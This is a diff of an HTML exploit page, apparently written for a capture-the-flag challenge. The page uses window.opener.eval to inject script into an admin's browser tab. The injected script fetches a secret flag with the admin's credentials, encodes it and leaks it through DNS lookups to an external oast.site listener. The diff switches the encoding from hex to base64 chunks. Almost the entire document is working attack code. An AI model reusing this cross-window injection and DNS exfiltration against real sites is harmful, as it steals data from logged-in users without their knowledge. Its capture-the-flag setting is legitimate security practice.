@@ -1,33 +1,29 @@
 <!DOCTYPE html>
-<html><body>
-<script>
+<html><body><script>
 if (window.opener) {
-  // Inject into the admin tab:
   window.opener.eval(`
-    (async ()=> {
-      // 1) pull the flag
+    (async () => {
+      // 1) get the flag
       const res  = await fetch('/get_flag', { credentials: 'include' });
-      const flag = await res.text();     // e.g. '{"flag":"L3AK{…}","message":"…"}'
+      const flag = await res.text();
 
-      // 2) encode as hex
-      let hex = Array.from(flag)
-                     .map(c => c.charCodeAt(0)
-                                  .toString(16)
-                                  .padStart(2,'0'))
-                     .join('');
-      // 3) split into DNS-legal labels (≤63 chars)
-      let labels = [];
-      for (let i = 0; i < hex.length; i += 63) {
-        labels.push(hex.slice(i, i + 63));
+      // 2) base64-encode and strip padding
+      const data  = btoa(flag).replace(/=/g, '');
+      const parts = data.match(/.{1,30}/g);  // splits into 30-char chunks
+
+      // 3) keep images alive so each DNS request actually fires
+      const imgs = [];
+      for (let i = 0; i < parts.length; i++) {
+        const sub = parts[i] + '.' + i + '.bkdxspdaaz5k3bcjumvu0si0h1d7zctqj.oast.site/';
+        const img = new Image();
+        img.src = 'http://' + sub;
+        document.body.appendChild(img);  // append so GC can’t throw it away
+        imgs.push(img);
       }
-      // 4) build your listener domain
-      const domain = labels.join('.') + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
-      // 5) fire one DNS lookup
-      const img = new Image();
-      img.src = 'http://' + domain + '/';
-      document.body.appendChild(img);
+
+      // Optional: expose for debugging
+      window._leaked = { parts, imgs };
     })();
   `);
 }
-</script>
-</body></html>
+</script></body></html>
